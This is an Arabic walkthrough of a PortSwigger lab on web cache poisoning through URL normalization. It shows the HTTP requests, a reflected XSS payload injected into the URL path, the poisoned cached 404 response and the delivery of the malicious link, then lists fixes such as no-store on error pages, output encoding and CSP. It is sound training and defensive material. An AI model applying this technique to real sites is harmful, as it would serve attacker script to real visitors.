# [URL normalization](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization)

## **`الهدف`**
ابحث عن ثغرة `XSS`، ثم قم بحقن `Payload` خبيث ينفذ الأمر `alert(1)` في متصفح الضحية، ثم أرسل عنوان `URL` الخبيث إلى الضحية.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater` 
```http
GET / HTTP/2
Host: 0a7c0089044e25f08070fd650018000f.web-security-academy.net
Cookie: session=AFnaWL3EsvkFsdqcS2ye6s0auYfGKhaY
```

بعد ذلك سنقوم بتعديل الطلب ونضيف أى مسار مثل `TEST`
```http
GET /TEST HTTP/2
Host: 0a7c0089044e25f08070fd650018000f.web-security-academy.net
Cookie: session=AFnaWL3EsvkFsdqcS2ye6s0auYfGKhaY
```
وسنجد أنه يحدث انعكاس في الاستجابة بالإضافة إلى أنه يتم حفظها في ذاكرة التخزين المؤقت
```http
HTTP/2 404 Not Found
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=10
Age: 1
X-Cache: hit
Content-Length: 23

<p>Not Found: /TEST</p>
```

لذلك سنقوم بتصميم `XSS Payload` مناسب
```Payload
TEST</p><script>alert(1)</script><p>TEST
```

ثم سنقوم بحقنه كمسار
```http
GET /TEST</p><script>alert(1)</script><p>TEST HTTP/2
Host: 0a7c0089044e25f08070fd650018000f.web-security-academy.net
Cookie: session=AFnaWL3EsvkFsdqcS2ye6s0auYfGKhaY
```
وسنلاحظ أنه انعكس في الاستجابة وتم حفظه في ذاكرة التخزين المؤقت
```http
HTTP/2 404 Not Found
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=10
Age: 2
X-Cache: hit
Content-Length: 59

<p>
	Not Found: /TEST
</p>
<script>
	alert(1)
</script>
<p>
	TEST
</p>
```

وإذا توجهنا إلى المتصفح وقمنا بفتح الرابط التالي:
```URL
https://0a7c0089044e25f08070fd650018000f.web-security-academy.net/TEST</p><script>alert(1)</script><p>TEST
```
سنجد أن الـ `POP UP` قد ظهرت، لذلك سنقوم بالتوجه إلى اللاب والضغط على زر توصيل الرابط  إلى الضحية ونُرسل هذا الرابط وبعد ذلك كل علينا فعله هو الاستمرار في إرسال الطلب عدة مرارة داخل `Repeater` حتى يزور الضحية الرابط لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب عدم تخزين صفحات الأخطاء، فلا يوجد سبب قوي يجعل التطبيق يحتفظ بصفحات `404 Not Found` في الـ Cache، خاصة إذا كانت تعكس مسار الرابط الذي أدخله المستخدم، لذلك يجب إرسال ترويسة تمنع التخزين مثل: 
`Cache-Control: private, no-store`

ويجب التأكد من أن سيرفر التخزين المؤقت والتطبيق الخلفي يقومان بفك ترميز ومعالجة مسار `URL` بنفس الطريقة تماماً.

ويجب ظبط سيرفرات التخزين المؤقت لتمتنع عن فك الترميز قبل توليد المفتاح `Cache Key`.

ويجب على السيرفر تطبيق آلية ترميز المخرجات `Output Encoding` لتحويل رموز `HTML` الخاصة إلى نصوص آمنة، فحتى لو تمكن المهاجم من إرسال كود `XSS` خبيث، سيتدخل المتصفح ويعرضه كنص مقروء ويمنع تنفيذ الـ `alert(1)` بفضل هذا الترميز.

ويجب على السيرفر تطبيق سياسة التحقق من المدخلات `Input Validation` بناءً على قائمة بيضاء `Whitelist` لرفض أي رموز غير متوقعة، فحتى لو حاول المهاجم التلاعب بالبيانات من جهة العميل، سيتدخل السيرفر ويرفض الطلب ويمنع إدخال أكواد `JavaScript` بفضل هذه الفلترة الصارمة.

ويجب على المطور الاعتماد على محركات قوالب `Template Engines` حديثة تدعم الترميز التلقائي `Auto-escaping`، فحتى لو نسي المطور معالجة بعض المدخلات يدوياً، سيتدخل إطار العمل `Framework` ويشفر البيانات ويمنع تفعيل وسم `script` بفضل هذه الحماية المدمجة، ولكن يجب التأكيد على أن محرك القوالب يجب أن يدعم `Context-Aware Auto-escaping`

ويجب على مسؤول النظام إعداد جدار حماية تطبيقات الويب `WAF` لفحص وتحليل جميع الطلبات الواردة، فحتى لو نسي المطورون ترقيع الثغرة برمجياً، سيتدخل الـ `WAF` ويحظر الطلب المشبوه ويمنع وصول الـ `Payload` إلى السيرفر بفضل قواعد الحماية `Rules` المحدثة.

وكطبقة حماية إضافية، يجب على السيرفر إرسال ترويسة `CSP` صارمة تمنع تنفيذ أكواد `JS` المدمجة `Inline Scripts` فحتى لو فشل السيرفر في فلترة البيانات، سيتدخل المتصفح ويمنع تنفيذ الـ `alert()` بفضل هذه السياسة.

وكخطوة أمان إضافية، بالرغم من أنها لن تمنع هذه الثغرة،يجب تفعيل خاصية `HttpOnly` لملفات تعريف الارتباط الخاصة بالجلسة `Session Cookies`، وعلى الرغم أن هذا الإجراء لن يمنع ثغرة الـ `XSS` من الحدوث، ولكنه سيمنع كود الجافاسكريبت الخبيث من الوصول إلى الجلسة عبر `document.cookie`، مما يفشل محاولات اختراق الحساب `Account Takeover`.
